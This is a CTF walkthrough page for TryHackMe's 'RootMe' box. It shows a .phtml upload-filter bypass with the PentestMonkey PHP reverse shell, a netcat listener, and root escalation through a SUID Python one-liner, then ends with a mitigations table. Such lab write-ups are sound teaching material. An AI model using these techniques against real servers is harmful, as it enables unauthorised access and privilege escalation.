@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RootMe — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="A file upload panel at /panel/ blocked .php but accepted .phtml, landing a www-data shell. SUID enumeration surfaced an unusual find: /usr/bin/python2.7…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/rootme.html">
+<meta property="og:title" content="RootMe — TryHackMe writeup">
+<meta property="og:description" content="A file upload panel at /panel/ blocked .php but accepted .phtml, landing a www-data shell. SUID enumeration surfaced an unusual find: /usr/bin/python2.7…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/rootme.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"RootMe — TryHackMe writeup","description":"A file upload panel at /panel/ blocked .php but accepted .phtml, landing a www-data shell. SUID enumeration surfaced an unusual find: /usr/bin/python2.7…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-07","url":"https://thecyberfarhan.github.io/writeups/rootme.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/rootme.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>RootMe</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 7, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>A file upload panel at <code>/panel/</code> blocked <code>.php</code> but accepted <code>.phtml</code>, landing a <code>www-data</code> shell. SUID enumeration surfaced an unusual find: <code>/usr/bin/python2.7</code> with the SUID bit set — something that should never exist outside a CTF. A single Python one-liner spawned a root shell. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🐚 Netcat</span><span class="chip">🐍 Python</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's patient is <strong>RootMe</strong> — a box that tells you exactly what to do right there in the name and then helpfully leaves the door ajar. It's a deceptively clean machine: just a web upload panel, a woefully incomplete file extension filter, and a Python interpreter that someone left running with root-level permissions. The escalation path is about as subtle as a flashing arrow labelled "this way to root." The real lesson here isn't the exploit — it's learning to spot the one file in a thousand-line SUID dump that genuinely shouldn't be there.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What file upload vulnerabilities are and why extension filtering matters</li><li>How to catch a reverse shell with Netcat</li><li>What SUID binaries are and why they matter for privilege escalation</li><li>Basic Python one-liners for shell spawning</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p class="aside">Full-range sweep with RustScan, Nmap for service and version fingerprinting:</p>
+<pre><code>rustscan -a 10.49.157.64 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.41 (Ubuntu)</td></tr></tbody></table>
+<p>Two ports again. Nmap notes the <code>PHPSESSID</code> cookie is missing the <code>HttpOnly</code> flag — same pattern as Neighbour, same implication: this is a PHP application and session security was not a priority. The HTTP title is <code>HackIT - Home</code>, which radiates beginner CTF energy.</p>
+<h3>Web Directory Enumeration</h3>
+<p class="aside">(~3 mins into the box)</p>
+<p class="aside">Feroxbuster with PHP, TXT, and HTML extensions:</p>
+<pre><code>feroxbuster -u http://10.49.157.64 \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -x php,txt,html</code></pre>
+
+<pre><code># output (relevant hits only)
+200  http://10.49.157.64/index.php
+301  http://10.49.157.64/panel       # ^^^ file upload panel
+301  http://10.49.157.64/uploads     # ^^^ where uploaded files land
+200  http://10.49.157.64/panel/index.php</code></pre>
+<p>Two finds that belong together: <code>/panel/</code> provides an upload form, <code>/uploads/</code> is the publicly browsable directory where files go. This pairing is the entire attack surface — upload a shell to <code>/panel/</code>, trigger it from <code>/uploads/</code>.</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~6 mins into the box)</p>
+<h3>File Upload — Extension Filter Bypass</h3>
+<p><strong>What is a file upload vulnerability?</strong> Web applications that accept file uploads need to ensure users can't upload executable server-side code. A common mitigation is to filter file extensions — but as with any denylist approach, the filter is only as complete as whoever wrote it. PHP files can be executed by Apache under several extensions beyond <code>.php</code>: notably <code>.phtml</code>, <code>.php5</code>, <code>.phar</code>, and others depending on server configuration. If the filter blocks <code>.php</code> but not its siblings, the protection is cosmetic.</p>
+<p class="aside">Attempting the obvious upload first — <code>.php</code> extension:</p>
+<pre><code># upload result
+PHP não é permitido!</code></pre>
+<p>Portuguese for "PHP is not allowed." The filter blocks <code>.php</code> by name, which is the most recognisable extension but not the only one Apache will execute as PHP.</p>
+<p class="aside">Renaming the PentestMonkey PHP reverse shell and re-uploading:</p>
+<pre><code>cp php-reverse-shell.php php-reverse-shell.phtml</code></pre>
+<p>The <code>.phtml</code> upload was accepted without complaint. The filter had never heard of it.</p>
+<p class="aside">Setting up the listener, then navigating to the uploaded file at <code>/uploads/</code> to trigger execution:</p>
+<pre><code>nc -nlvp 4444</code></pre>
+
+<pre><code># reverse shell callback
+connect to [192.168.133.233] from (UNKNOWN) [10.49.157.64] 32968
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+<p class="aside">Stabilising with Python PTY:</p>
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~8 mins into the box)</p>
+<p>We land as <code>www-data</code>. Three home directories exist: <code>rootme</code>, <code>test</code>, and <code>ubuntu</code> — none readable from this account. The user flag wasn't in the obvious <code>/home/</code> locations.</p>
+<p class="aside">Hunting for the flag by filename:</p>
+<pre><code>find / -name user.txt 2&gt;/dev/null</code></pre>
+
+<pre><code>/var/www/user.txt   # ^^^ non-standard location</code></pre>
+
+<pre><code>cat /var/www/user.txt</code></pre>
+
+<pre><code>THM{y0u_g0t_a_sh3ll}</code></pre>
+<p>The flag lived in the web root's parent directory rather than a home folder — a mild departure from convention that required <code>find</code> rather than a straight <code>cat</code>.</p>
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~10 mins into the box)</p>
+<h3>SUID Enumeration</h3>
+<p><strong>What are SUID binaries?</strong> The Set User ID (SUID) permission bit on an executable means it runs with the *file owner's* privileges rather than the *calling user's*. When a binary owned by root has SUID set, anyone who executes it effectively runs it as root — regardless of who they are. This is intentional for specific binaries like <code>passwd</code> (which needs root to edit <code>/etc/shadow</code>) but catastrophic for general-purpose tools or interpreters.</p>
+<p class="aside">Finding all SUID binaries on the system:</p>
+<pre><code>find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
+<p>The output is long. Most entries are expected system binaries. One entry is not:</p>
+<pre><code>-rwsr-xr-x 1 root root 3657904 Dec  9  2024 /usr/bin/python2.7</code></pre>
+<p>In a standard Linux installation, <strong>interpreters never have the SUID bit set</strong>. <code>python</code>, <code>perl</code>, <code>ruby</code>, <code>node</code> — none of them should appear in a SUID scan. When they do, it means any user can run arbitrary code as root through them.</p>
+<h3>SUID Python — GTFOBins</h3>
+<p>The escalation is a single Python one-liner. <code>os.execl()</code> replaces the current process with a new one — <code>/bin/sh</code> — and the <code>-p</code> flag tells <code>sh</code> to preserve the effective UID (root) rather than dropping it back to the calling user's UID.</p>
+<p class="aside">Spawning a root shell via the SUID Python binary:</p>
+<pre><code>python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</code></pre>
+
+<pre><code># whoami
+root</code></pre>
+<p class="aside">Collecting the root flag:</p>
+<pre><code>cat /root/root.txt</code></pre>
+
+<pre><code>THM{pr1v1l3g3_3sc4l4t10n}</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong><code>.phtml</code> upload bypass</strong> at <code>/panel/</code> — filter blocked <code>.php</code> but not <code>.phtml</code>, landing a reverse shell as <code>www-data</code></li><li><strong>SUID Python2.7</strong> — interpreter with root SUID set, executed a one-liner to spawn a root shell</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>Exploring <code>/home/rootme/</code> and <code>/home/test/</code></h3>
+<p>After landing the shell, both home directories were investigated. Neither was readable by <code>www-data</code> — permissions were locked down. <code>.sudo_as_admin_successful</code> in <code>/home/rootme/</code> is an empty marker file created when a user successfully runs <code>sudo</code> for the first time; it contains no useful information. The user flag ultimately wasn't in either home directory anyway.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>File upload filter — <code>.phtml</code> not blocked</td><td class="sev-high">High</td><td>Use a strict allowlist of safe extensions (<code>.jpg</code>, <code>.png</code>, <code>.pdf</code> only); validate file content via magic bytes, not just the name; store uploads outside the webroot or disable PHP execution in the uploads directory via Apache config</td></tr><tr><td>SUID bit set on Python interpreter</td><td class="sev-critical">Critical</td><td>Remove the SUID bit immediately: <code>chmod u-s /usr/bin/python2.7</code>; audit all SUID binaries regularly with <code>find / -perm -4000</code>; no interpreter should ever have SUID</td></tr><tr><td>Missing <code>HttpOnly</code> flag on <code>PHPSESSID</code></td><td>Low</td><td>Set <code>session.cookie_httponly = 1</code> in <code>php.ini</code></td></tr><tr><td>User flag in web-accessible directory</td><td class="sev-medium">Medium</td><td>Store flags and sensitive files outside the webroot; <code>/var/www/</code> is partially web-accessible depending on configuration</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>When reviewing SUID binaries, the question isn't "do I recognise this binary" — it's "should this binary *ever* have SUID set?" Interpreters, scripting tools, and package managers on that list are immediate red flags. A single <code>find / -perm -4000</code> run and thirty seconds on GTFOBins is often all that stands between <code>www-data</code> and root.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Run the SUID search before looking for other escalation vectors — on this box it was the very first thing that mattered, and filtering the output mentally for "things that should never have SUID" is a skill worth drilling until it's automatic.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/rootme_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
